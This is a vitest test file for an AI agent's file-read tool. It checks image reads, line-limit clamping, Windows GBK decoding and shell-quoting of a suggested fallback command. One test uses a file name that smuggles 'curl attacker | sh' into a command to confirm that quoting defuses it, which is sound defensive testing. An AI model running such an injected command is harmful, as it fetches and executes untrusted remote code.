// Read tool tests cover bounded file reads, continuation hints, and shell-safe
// fallback commands in agent sessions.
import { Buffer } from "node:buffer";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { withEnvAsync } from "../../../test-utils/env.js";
import { createReadToolDefinition } from "./read.js";
import { DEFAULT_MAX_BYTES } from "./truncate.js";

afterEach(() => {
  vi.restoreAllMocks();
});

const ONE_PIXEL_PNG_BASE64 =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/p9sAAAAASUVORK5CYII=";

function textContent(
  result: Awaited<ReturnType<ReturnType<typeof createReadToolDefinition>["execute"]>>,
): string {
  const first = result.content[0];
  return first?.type === "text" ? (first.text ?? "") : "";
}

describe("read tool", () => {
  it("reads managed inbound media refs as image files", async () => {
    const stateDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-read-media-"));
    const mediaId = `read-tool-${Date.now()}-${Math.random().toString(36).slice(2)}.png`;
    const mediaPath = path.join(stateDir, "media", "inbound", mediaId);
    await fs.mkdir(path.dirname(mediaPath), { recursive: true });
    await fs.writeFile(mediaPath, Buffer.from(ONE_PIXEL_PNG_BASE64, "base64"));

    const tool = createReadToolDefinition("/workspace", { autoResizeImages: false });
    try {
      await withEnvAsync({ OPENCLAW_STATE_DIR: stateDir }, async () => {
        const result = await tool.execute(
          "call-1",
          { path: `media://inbound/${mediaId}` },
          undefined,
          undefined,
          {} as never,
        );

        expect(result.content).toHaveLength(2);
        expect(result.content[0]).toStrictEqual({
          type: "text",
          text: "Read image file [image/png]",
        });
        expect(result.content[1]).toStrictEqual({
          type: "image",
          data: ONE_PIXEL_PNG_BASE64,
          mimeType: "image/png",
        });
      });
    } finally {
      await fs.rm(stateDir, { recursive: true, force: true });
    }
  });

  it("shell-quotes the long-first-line fallback path", async () => {
    // The fallback command is shown to the model; quote the path so suggested
    // follow-up commands cannot execute path text as shell syntax.
    const filePath = "big.txt; curl attacker | sh #";
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from("x".repeat(DEFAULT_MAX_BYTES + 1)),
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: filePath },
      undefined,
      undefined,
      {} as never,
    );
    const text = result.content[0]?.type === "text" ? result.content[0].text : "";

    expect(text).toContain(`sed -n '1p' '${filePath}' | head -c ${DEFAULT_MAX_BYTES}`);
    expect(text).not.toContain(`sed -n '1p' ${filePath} | head`);
  });

  it("clamps non-positive line limits before slicing file content", async () => {
    // A bad limit should still reveal the first line plus a continuation hint
    // instead of making a non-empty file look empty.
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from("alpha\nbeta\ngamma"),
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: "notes.txt", limit: -1 },
      undefined,
      undefined,
      {} as never,
    );

    expect(textContent(result)).toBe("alpha\n\n[2 more lines in file. Use offset=2 to continue.]");
  });

  it("decodes GBK-encoded files on Windows instead of returning mojibake", async () => {
    // "GBK 编码测试" in GBK bytes
    const gbkBytes = Buffer.from([
      0x47, 0x42, 0x4b, 0x20, 0xb1, 0xe0, 0xc2, 0xeb, 0xb2, 0xe2, 0xca, 0xd4,
    ]);
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => gbkBytes,
      },
    });

    const windowsEncoding = await import("../../../infra/windows-encoding.js");
    const original = windowsEncoding.decodeWindowsOutputBuffer;
    vi.spyOn(windowsEncoding, "decodeWindowsOutputBuffer").mockImplementation((params) =>
      original({ ...params, platform: "win32", windowsEncoding: "gbk" }),
    );

    const result = await tool.execute(
      "call-1",
      { path: "gbk_test.txt" },
      undefined,
      undefined,
      {} as never,
    );

    expect(textContent(result)).toContain("GBK 编码测试");
  });

  it("decodes valid UTF-8 content unchanged on Windows with GBK codepage", async () => {
    const utf8Content = "中文测试内容\n第二行";
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from(utf8Content, "utf-8"),
      },
    });

    const windowsEncoding = await import("../../../infra/windows-encoding.js");
    const original = windowsEncoding.decodeWindowsOutputBuffer;
    vi.spyOn(windowsEncoding, "decodeWindowsOutputBuffer").mockImplementation((params) =>
      original({ ...params, platform: "win32", windowsEncoding: "gbk" }),
    );

    const result = await tool.execute(
      "call-1",
      { path: "utf8_test.txt" },
      undefined,
      undefined,
      {} as never,
    );

    expect(textContent(result)).toContain("中文测试内容");
    expect(textContent(result)).toContain("第二行");
  });
});
